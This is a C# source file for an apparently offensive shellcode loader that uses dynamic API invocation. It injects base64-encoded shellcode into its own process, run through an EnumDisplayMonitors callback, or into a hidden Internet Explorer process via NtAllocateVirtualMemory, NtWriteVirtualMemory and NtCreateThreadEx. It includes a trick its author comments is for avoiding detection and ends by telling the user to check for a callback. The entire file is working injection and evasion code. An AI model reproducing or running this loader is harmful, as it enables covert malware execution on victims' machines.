using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
namespace Dinvoke
{
    [StructLayout(LayoutKind.Sequential)]
    public struct Rect
    {
        public int left;
        public int top;
        public int right;
        public int bottom;
    }
    class Delegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr EnumDisplayMonitors(
        IntPtr hdc,
        IntPtr lprcClip,
        IntPtr lpfnEnum,
        IntPtr dwData);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
         );
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
    }

    class Program
    {
        public static IntPtr EnumDisplayMonitors(IntPtr hMonitor, IntPtr hdcMonitor, IntPtr lprcMonitor, IntPtr dwData)
        {
            object[] funcargs = { hMonitor, hdcMonitor, lprcMonitor, dwData };
            IntPtr retVal = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke("user32.dll", "EnumDisplayMonitors", typeof(Delegates.EnumDisplayMonitors), ref funcargs);
            return retVal;
        }

        public static IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            object[] funcargs =
            {
                lpAddress, dwSize, flAllocationType, flProtect
            };
            IntPtr retValue = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke(@"kernel32.dll", @"VirtualAlloc", typeof(Delegates.VirtualAlloc), ref funcargs);
            return retValue;

        }
        public static IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            object[] funcargs =
            {       
                hProcess, lpAddress, dwSize, flAllocationType, flProtect
            };
            IntPtr retVal = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "VirtualAllocEx", typeof(Delegates.VirtualAllocEx), ref funcargs);
            return retVal;
        }

        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            object[] funcargs =
            {
                lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId
            };
            IntPtr retVal = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "CreateThread", typeof(Delegates.CreateThread), ref funcargs);
            return retVal;
        }
        public static IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId)
        {
            object[] funcargs =
{
                 processAccess,  bInheritHandle,  processId
            };
            IntPtr retValue = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke(@"kernel32.dll", @"OpenProcess", typeof(Delegates.OpenProcess), ref funcargs);
            return retValue;
        }
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); //aparently this thing helps with avoiding detections lol
            if (mem == null)
            {
                return;
            }
            Dictionary<string, string>  parsedArgs = ParseArgs(args);

            if (!parsedArgs.ContainsKey("/m"))
            {
                Help();
            }
            else if (parsedArgs["/m"] == "1" && parsedArgs.ContainsKey("/f"))
            {
                if (parsedArgs["/f"] == "" || !File.Exists(parsedArgs["/f"]))
                {
                    Console.WriteLine("[!] File does not exist!");
                    return;
                }
                byte[] buf = PrepareBytes(parsedArgs["/f"]);
                Local(buf);
            }
            else if (parsedArgs["/m"] == "1" && !parsedArgs.ContainsKey("/f"))
            {
                byte[] buf = PrepareBytes();
                Local(buf);
            }
            else if (parsedArgs["/m"] == "2" && parsedArgs.ContainsKey("/f"))
            {
                if (parsedArgs["/f"] == "" || !File.Exists(parsedArgs["/f"]))
                {
                    Console.WriteLine("[!] File does not exist!");
                    return;
                }
                PrepareBytes(parsedArgs["/f"]);
                byte[] buf = PrepareBytes(parsedArgs["/f"]);
                Console.WriteLine("[+] We sacrificing Internet Explorer to the blood gods.");
                Sacrificial(buf);
            }
            else if (parsedArgs["/m"] == "1" && !parsedArgs.ContainsKey("/f"))
            {
                byte[] buf = PrepareBytes();
                Console.WriteLine("[+] We sacrificing Internet Explorer to the blood gods.");
                Sacrificial(buf);
            }

        }
        static void Help()
        {
            string help = @"
[-] Usage: DinvokeDeez.exe
    Mandatory Keys
    /m => Specifies the injection type. 1 = Local Process Injection 2 = Remote Process Injection

    Optional Keys
    /f => Specifies a path to alternative base64 encoded shellcode to inject with.
    
    example: DinvokeDeez.exe /m:1 /f:D:\Downloads\donut_v0.9.3\test.bin
";
            Console.WriteLine(help);
        }

        static byte[] PrepareBytes()
        {
            var assembly = Assembly.GetExecutingAssembly();
            string stuff = "";
            using (Stream stream = assembly.GetManifestResourceStream("DinvokeWinCallback.loader.b64"))
            using (StreamReader reader = new StreamReader(stream))
            {
                string readerResult = reader.ReadToEnd();
                stuff = readerResult;
            }
            byte[] buf = Convert.FromBase64String(stuff);
            Console.WriteLine("[+] Prepping " + buf.Length + " bytes.");
            return buf;
        }
        static byte[] PrepareBytes(string filepath)
        {
            byte[] buf = Convert.FromBase64String(File.ReadAllText(filepath));
            return buf;
            
        }

        public static Dictionary<string, string> ParseArgs(string[] args)
        {
            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }
            return arguments;
        }
        public static void Local(byte[] buf)
        {
            IntPtr handle = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, handle, buf.Length);
            Console.WriteLine("[+] Shellcode copied and pasted!");
            EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, handle, IntPtr.Zero);
            return;
            //IntPtr hThread = CreateThread(IntPtr.Zero, 0, handle, IntPtr.Zero, 0, IntPtr.Zero); This is traditional but I like EnumDisplayMonitors more
            //WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public static void Sacrificial(byte[] buf) //sacrificial internet explorer moment
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            string ProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            startInfo.FileName = ProgramFiles + @"\Internet Explorer\iexplore.exe";
            startInfo.CreateNoWindow = true;
            startInfo.ErrorDialog = false;
            startInfo.WindowStyle = ProcessWindowStyle.Minimized;
            Process.Start(startInfo);
            foreach (Process proc in Process.GetProcessesByName("iexplore"))
            {
                try
                {
                    int pid = proc.Id;
                    IntPtr handle = OpenProcess(0x001F0FFF, false, (uint)pid);
                    Console.WriteLine("[+] Process Opened!");

                    IntPtr baseaddr = IntPtr.Zero;
                    IntPtr regionSizePointer = (IntPtr)buf.Length;


                    DynamicInvoke.Native.NtAllocateVirtualMemory(handle, ref baseaddr, IntPtr.Zero, ref regionSizePointer, 0x3000, 0x40); //rwx on memory page
                    Console.WriteLine("[+] Allocated!");

                    var unmanagedBuffer = Marshal.AllocHGlobal(buf.Length);
                    Marshal.Copy(buf, 0, unmanagedBuffer, buf.Length);
                    Console.WriteLine("[+] Copied!");
                    DynamicInvoke.Native.NtWriteVirtualMemory(handle, baseaddr, unmanagedBuffer, (uint)buf.Length);
                    Console.WriteLine("[+] Pasted!");

                    IntPtr hThread = IntPtr.Zero;
                    DynamicInvoke.Native.NtCreateThreadEx(ref hThread, Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, handle, baseaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                    Thread.Sleep(500);
                    proc.Kill();
                    Console.WriteLine("[*] Check for callback");
                    return;
                }
                catch
                {
                    ;
                }
            }
        }
    }
}